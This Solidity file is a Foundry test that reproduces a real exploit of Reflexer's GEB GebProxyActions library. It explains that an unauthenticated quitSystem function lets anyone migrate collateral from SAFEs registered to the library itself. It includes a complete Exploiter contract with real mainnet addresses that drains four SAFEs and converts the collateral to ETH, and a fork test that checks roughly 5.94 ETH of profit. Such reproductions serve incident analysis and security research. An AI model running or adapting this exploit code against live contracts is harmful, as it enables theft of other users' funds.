// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : ~5.94 ETH (~$14K)
// Attacker : https://etherscan.io/address/0xb929c7215c0ec8ebad5fbf73b1da63bccfff1896
// Attack Contract : https://etherscan.io/address/0x6a213f0b5bd9eed865d3e2efc867b73dfe9039e7
// Vulnerable Contract (shared library) : https://etherscan.io/address/0x84fe452d9fb495a335c74a225e6ad52c35eb8616 (GebProxyActions)
// Attack Tx : https://etherscan.io/tx/0xfbce28e35c26358110dd9ed91f9ceef588acb264c3cf6c573df65ca21335058f

// @Analysis
// Protocol : Reflexer's GEB framework (RAI-style CDP system), in Global Settlement since Jan 2021.
// Alert : ExVul / SkyEye
//
// Root cause:
// GebProxyActions is a SHARED, stateless "proxy actions" library. It is meant to be DELEGATECALLED
// through each user's own DSProxy so that, from GebSafeManager's point of view, msg.sender is the
// per-user proxy that actually owns the SAFE. Several SAFEs (ids 3, 5, 8, 18 for collateral ETH-A)
// were instead registered in GebSafeManager with ownsSAFE[safe] == the GebProxyActions library's OWN
// address (0x84FE...), i.e. the library contract itself is the registered owner.
//
// GebProxyActions.quitSystem(manager, safe, dst) is a plain public function with NO authentication.
// It simply forwards to GebSafeManager.quitSystem(safe, dst). When called DIRECTLY on the library
// (not via a proxy), the manager sees msg.sender == the library address, which equals ownsSAFE[safe],
// so the safeAllowed(safe) check passes. That lets ANY external caller migrate the collateral of
// those SAFEs to an address of their choosing.
//
// Because the system is in Global Settlement, the flow per SAFE is:
//   GlobalSettlement.processSAFE  -> clears the SAFE's debt, leaving free collateral in the handler
//   GebProxyActions.quitSystem    -> moves that free collateral into the attacker's own SAFE balance
//   GlobalSettlement.freeCollateral -> converts it to internal ETH-A tokenCollateral
// After looping every stolen SAFE, one CollateralJoin.exit + WETH.withdraw turns it into ETH.
//
// This drains leftover/dormant collateral from old CDP positions of a protocol that has been shut
// down (Global Settlement) since January 2021 - not an actively-used live protocol - but it is a
// real, self-contained, permissionless theft of other users' funds and worth documenting.

interface ISAFEEngine {
    function approveSAFEModification(address account) external;
    function tokenCollateral(bytes32 collateralType, address account) external view returns (uint256);
    function safes(bytes32 collateralType, address safe) external view returns (uint256 lockedCollateral, uint256 generatedDebt);
}

interface IGebSafeManager {
    function safes(uint256 safe) external view returns (address handler);
    function ownsSAFE(uint256 safe) external view returns (address owner);
    function allowHandler(address usr, uint256 ok) external;
}

interface IGlobalSettlement {
    function processSAFE(bytes32 collateralType, address safe) external;
    function freeCollateral(bytes32 collateralType) external;
}

// The vulnerable shared library. quitSystem is public and unauthenticated.
interface IGebProxyActions {
    function quitSystem(address manager, uint256 safe, address dst) external;
}

interface ICollateralJoin {
    function exit(address account, uint256 wad) external;
}

interface IWETH {
    function withdraw(uint256 wad) external;
    function balanceOf(address account) external view returns (uint256);
}

// Standalone exploit contract, matching the on-chain attack contract: an unprivileged contract that
// migrates SAFEs owned by the GebProxyActions library to itself and cashes the collateral out to ETH.
contract Exploiter {
    ISAFEEngine constant SAFE_ENGINE = ISAFEEngine(0xf0b7808b940b78bE81ad6F9E075Ce8be4A837E2c);
    IGebSafeManager constant MANAGER = IGebSafeManager(0xdF88b73462abD08f145b4b31edf4966C7129B255);
    IGlobalSettlement constant GLOBAL_SETTLEMENT = IGlobalSettlement(0x4d37Ef04724fec8b80AAB3F6B7e7F4ef4181D9a9);
    IGebProxyActions constant PROXY_ACTIONS = IGebProxyActions(0x84FE452d9fb495A335C74a225e6AD52C35eB8616);
    ICollateralJoin constant ETH_A_JOIN = ICollateralJoin(0xE843783144AcDf485Ff86D726bCb67dD316e0BBE);
    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    bytes32 constant ETH_A = 0x4554482d41000000000000000000000000000000000000000000000000000000; // "ETH-A"

    receive() external payable {}

    function run() external {
        // Allow the manager to move collateral into this contract's SAFEEngine balance.
        SAFE_ENGINE.approveSAFEModification(address(MANAGER));
        MANAGER.allowHandler(address(PROXY_ACTIONS), 1);

        // The four SAFEs whose registered owner is the GebProxyActions library itself.
        uint256[4] memory safeIds = [uint256(3), 5, 8, 18];

        for (uint256 i = 0; i < safeIds.length; i++) {
            uint256 safeId = safeIds[i];
            require(MANAGER.ownsSAFE(safeId) == address(PROXY_ACTIONS), "safe not owned by library");
            address handler = MANAGER.safes(safeId);

            // 1. Clear the SAFE's debt so its collateral becomes free (Global Settlement).
            GLOBAL_SETTLEMENT.processSAFE(ETH_A, handler);

            // 2. THE BUG: call the public, unauthenticated library function directly. The manager
            //    sees msg.sender == the library, which passes ownsSAFE[safe] == msg.sender, and the
            //    collateral is migrated to us.
            PROXY_ACTIONS.quitSystem(address(MANAGER), safeId, address(this));

            // 3. Convert the migrated collateral into internal ETH-A tokenCollateral for this contract.
            GLOBAL_SETTLEMENT.freeCollateral(ETH_A);
        }

        // Cash out the whole stolen balance to WETH, then to ETH.
        uint256 amount = SAFE_ENGINE.tokenCollateral(ETH_A, address(this));
        ETH_A_JOIN.exit(address(this), amount);
        WETH.withdraw(WETH.balanceOf(address(this)));
    }
}

contract ReflexerGEBExploit is BaseTestWithBalanceLog {
    address constant ATTACKER = 0xB929C7215c0ec8EbAD5fBf73b1Da63bccfFf1896;
    uint256 constant FORK_BLOCK = 25_883_378; // block before the attack (25883379)

    Exploiter internal exploiter;

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        exploiter = new Exploiter();
        attacker = address(exploiter); // balanceLog tracks the profit contract's ETH gain
    }

    function testExploit() public balanceLog {
        // Match the real trace: EOA (tx.origin) drives an unprivileged contract that does the work.
        vm.prank(ATTACKER, ATTACKER);
        exploiter.run();

        // Net collateral drained in the original tx: 5943599831844387377 wei (~5.9436 ETH).
        emit log_named_decimal_uint("Attacker ETH profit", address(exploiter).balance, 18);
        assertApproxEqAbs(address(exploiter).balance, 5_943_599_831_844_387_377, 1e15, "profit off vs on-chain 5.94 ETH");
    }
}
